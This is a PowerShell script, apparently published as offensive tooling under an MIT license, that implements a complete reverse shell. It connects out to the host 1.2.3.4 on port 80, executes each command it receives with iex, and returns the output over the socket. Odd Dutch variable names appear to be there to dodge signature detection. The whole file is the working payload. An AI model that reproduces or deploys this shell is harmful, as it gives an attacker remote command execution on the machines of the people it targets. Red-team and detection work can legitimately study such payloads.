<#
    .NOTES
        Author: Justin Perdok (@JustinPerdok), https://justin-p.me.
        License: MIT

    .LINK
        https://github.com/justin-p/PowerShell/blob/master/DikkeByte.ps1
#>
$slave = New-Object System.Net.Sockets.TCPClient("1.2.3.4",80);$waterval = $slave.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $waterval.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$terugmetdiehandel = (iex $data 2>&1 | Out-String );$terugmetdiehandel2 = $terugmetdiehandel + (Get-Location).Path + ":: ";$DikkeByte = ([text.encoding]::ASCII).GetBytes($terugmetdiehandel2);$waterval.Write($DikkeByte,0,$DikkeByte.Length);$waterval.Flush()};$slave.Close()
